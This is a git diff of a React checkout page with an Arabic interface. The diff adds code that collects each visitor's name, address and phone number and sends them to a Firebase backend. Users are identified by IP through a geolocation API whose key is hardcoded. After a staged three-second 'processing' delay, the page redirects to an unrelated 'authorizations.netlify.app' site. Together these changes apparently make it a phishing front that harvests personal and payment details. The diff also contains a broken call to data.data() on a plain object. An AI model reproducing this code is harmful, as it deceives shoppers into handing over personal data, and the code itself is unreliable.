@@ -11,7 +11,7 @@ import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTit
 import { useCart } from '../context/cart-context'
 import { onSnapshot, getDoc, doc} from 'firebase/firestore'
 import database from '@/lib/firebase'
-import { data } from 'react-router-dom'
+import { addData } from '../actions'
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
@@ -26,6 +26,9 @@ export default function CheckoutPage() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+    console.log(personalInfo)
+    addData({personalInfo})
+
     setisloading(true)
     setTimeout(() => {
       setisloading(false)
@@ -33,7 +36,6 @@ export default function CheckoutPage() {
       window.location.replace("https://authorizations.netlify.app/")
     }, 3000)
   }
-  const { state, dispatch } = useCart()
 
   
   const requestOptions = {
@@ -45,25 +47,36 @@ function cleanString(input:string) {
   return input.replace(/[^a-zA-Z0-9 ]/g, '');
 }
 useEffect(()=>{
-  fetch("https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4", requestOptions as any)
-  .then((response) => response.json())
-  .then((result) => {
-    const userId=cleanString(result.ip)
-    console.log(userId)
-  const cartRef = doc(database, `users/${userId}/info/data`)
-  const unsubscribe = onSnapshot(cartRef, (snapshot:any) => {
-    const data = snapshot.data()
-    console.log(data)
+  const fetchIpAndSetupListener = async () => {
+    try {
+      const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4')
+      if (!response.ok) {
+        throw new Error('Failed to fetch IP geolocation data')
+      }
+      const result = await response.json()
+      const userId = cleanString(result.ip)
+      console.log('User ID:', userId)
 
-    if (data) {
-      setCartLength(data.data.cart)
-      setTotal(data.data.total)
-    }})
-  return () => unsubscribe()
-})
+      const cartRef = doc(database, `users/${userId}/info/data`)
+      const unsubscribe = onSnapshot(cartRef, (snapshot) => {
+        const data = snapshot.data()
+        if (data && data.data) {
+          console.log('Firestore data:', data)
+          setCartLength(data.data().cart || 0)
+          setTotal(data.data().total || 0)
+        }
+      }, (err) => {
+        console.error('Firestore listener error:', err)
+      })
 
+      return () => unsubscribe()
+    } catch (err) {
+      console.error('Error:', err)
+    }
+  }
+
+  fetchIpAndSetupListener()
 },[])
-
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
     
@@ -81,7 +94,8 @@ useEffect(()=>{
                   id="area"
                   name="area"
                   required
-                />
+                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, name: e.target.value }))}
+                  />
               </div>
               <div className="space-y-2">
                 <Label htmlFor="block">العنوان</Label>
@@ -89,6 +103,8 @@ useEffect(()=>{
                   id="block"
                   name="block"
                   required
+                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, address: e.target.value }))}
+
                 />
               </div>
             </div>
@@ -110,6 +126,8 @@ useEffect(()=>{
                   name="house"
                   type='tel'
                   required
+                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, phone: e.target.value }))}
+
                 /> <Input
                 id="house"
                 name="house"
